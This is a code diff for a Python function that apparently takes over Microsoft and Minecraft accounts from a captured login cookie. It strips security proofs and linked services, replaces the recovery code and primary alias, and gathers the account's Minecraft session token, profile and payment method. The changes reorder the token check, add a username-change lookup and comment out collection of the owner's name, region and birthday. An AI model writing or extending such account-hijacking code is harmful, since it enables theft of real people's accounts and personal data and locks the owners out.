@@ -1,8 +1,9 @@
 from views.utils.securing.securityInformation import securityInformation
 from views.utils.securing.recoveryCodeSecure import recoveryCodeSecure
 from views.utils.securing.changePrimaryAlias import changePrimaryAlias
+from views.utils.minecraft.getUsernameInfo import getUsernameInfo
 from views.utils.securing.getRecoveryCode import getRecoveryCode
-from views.utils.securing.getAccountInfo import getAccountInfo
+# from views.utils.securing.getAccountInfo import getAccountInfo
 from views.utils.securing.removeServices import removeServices
 from views.utils.securing.generateEmail import generateEmail
 from views.utils.securing.removeProof import removeProof
@@ -39,7 +40,6 @@ def secure(msaauth: str):
         "recoveryCode": "Couldn't Change!",
         "loginCookie": msaauth,
         "status": "Unknown",
-        "timeTaken": 0,
         "SSID": False,
         "firstName": "Failed to Get",
         "lastName": "Failed to Get",
@@ -50,17 +50,9 @@ def secure(msaauth: str):
         "capes": "No capes"
     }
     
-    canary, apicanary, amsc = getCookies() 
+    apicanary, amsc = getCookies() 
     print("[+] - Got Cookies! Polishing login cookie...")
     host = polishHost(msaauth, amsc)
-    if host == "Locked":
-        accountInfo["email"] = "Locked"
-        accountInfo["secEmail"] = "Locked"
-        accountInfo["recoveryCode"] = "Locked"
-        accountInfo["password"] = "Locked"
-        accountInfo["status"] = "Locked"
-
-        return accountInfo
 
     if host == "Down":
         accountInfo["email"] = "Microsoft Down"
@@ -70,6 +62,21 @@ def secure(msaauth: str):
         accountInfo["status"] = "Microsoft Down"
 
         return accountInfo
+    
+    T = getT(msaauth, amsc)
+
+    # This means the account hasn't accepted TOS (To be fixed asap)
+    if not T:
+
+        print("[X] - Failed to get T\n[~] - This account needs to accept TOS manually (for now...)")
+
+        # accountInfo["email"] = "Microsoft Down"
+        # accountInfo["secEmail"] = "Microsoft Down"
+        # accountInfo["recoveryCode"] = "Microsoft Down"
+        # accountInfo["password"] = "Microsoft Down"
+        # accountInfo["status"] = "Microsoft Down"
+
+        return None
     
     # Minecraft checking
     print("[~] - Checking Minecraft Account")
@@ -84,7 +91,7 @@ def secure(msaauth: str):
         ssid = getSSID(xbl)
         
         # Get capes, profile and purchase method
-        if ssid:
+        if ssid:    
             print("[+] - Got SSID! (Has Minecraft)")
             accountInfo["SSID"] = ssid
 
@@ -103,6 +110,12 @@ def secure(msaauth: str):
             else:
                 print(f"[+] - Got profile (Has Minecraft Java)")
                 accountInfo["oldName"] = profile
+                
+                usernameInfo = getUsernameInfo(ssid)
+                if type(usernameInfo) is bool:
+                    accountInfo["usernameInfo"] = "Yes"
+                else:
+                    accountInfo["usernameInfo"] = f"Changeable in {usernameInfo} days"
 
             method = getMethod(ssid)
             if method:
@@ -115,26 +128,7 @@ def secure(msaauth: str):
         print("[x] - Failed to get XBL (Account has no Xbox Profile)")
         accountInfo["oldName"] = "No Minecraft"
 
-    T = getT(msaauth, amsc)
-
-    if not T:
-
-        print("[X] - Failed to get T")
-        # This general has 2 reasons
-        # 1. Microsoft really is down
-        # 2. Microsoft is not allowing any logins in this acc 
-        # .eg if you try to login manually itl redirect you to an error page
-
-        accountInfo["email"] = "Microsoft Down"
-        accountInfo["secEmail"] = "Microsoft Down"
-        accountInfo["recoveryCode"] = "Microsoft Down"
-        accountInfo["password"] = "Microsoft Down"
-        accountInfo["status"] = "Microsoft Down"
-
-        return accountInfo
-
     # Security Steps
-
     if T:
         print("[+] - Found T")
         amrp = getAMRP(T, amsc)
@@ -154,15 +148,15 @@ def secure(msaauth: str):
             print("[+] - Removed all Proofs")
                                           
             removeServices(amrp, amsc)          
+    
+            # accountMSInfo = getAccountInfo()
 
-            accountMSInfo = getAccountInfo()
-
-            accountInfo["firstName"] = accountMSInfo["firstName"]
-            accountInfo["lastName"] = accountMSInfo["lastName"]
-            accountInfo["fullName"] = accountMSInfo["fullName"]
-            accountInfo["region"] = accountMSInfo["region"]
-            accountInfo["birthday"] = accountMSInfo["birthday"]
-            print("[+] - Got Account Information")
+            # accountInfo["firstName"] = accountMSInfo["firstName"]
+            # accountInfo["lastName"] = accountMSInfo["lastName"]
+            # accountInfo["fullName"] = accountMSInfo["fullName"]
+            # accountInfo["region"] = accountMSInfo["region"]
+            # accountInfo["birthday"] = accountMSInfo["birthday"]
+            # print("[+] - Got Account Information")
 
             securityParameters = json.loads(securityInformation(amrp))
             print("[+] - Got Security Parameters")
